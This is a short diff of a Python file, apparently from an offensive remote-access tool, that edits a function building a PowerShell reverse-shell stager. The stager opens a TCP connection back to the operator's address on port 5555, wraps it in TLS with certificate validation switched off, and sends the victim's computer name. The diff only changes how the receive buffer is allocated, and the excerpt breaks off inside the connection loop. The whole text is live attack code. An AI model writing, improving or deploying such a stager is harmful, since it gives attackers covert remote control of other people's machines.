@@ -145,7 +145,7 @@ def clientUpload(fileToUpload,clientconn,powershellExec,isExe):
 def printListener():
     windows_powershell_stager = (
         "$c = New-Object System.Net.Sockets.TCPClient('" + FUNCTIONS().CheckInternet() + "','" + str(5555) + "');"
-        "[byte[]]$b = 0..65535|%{0};"
+        "$b = New-Object Byte[] $c.ReceiveBufferSize;"
         "$sl = New-Object System.Net.Security.SslStream $c.GetStream(),$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]);"
         "$sl.AuthenticateAsClient($env:computername);"
         "while($c.Connected){"
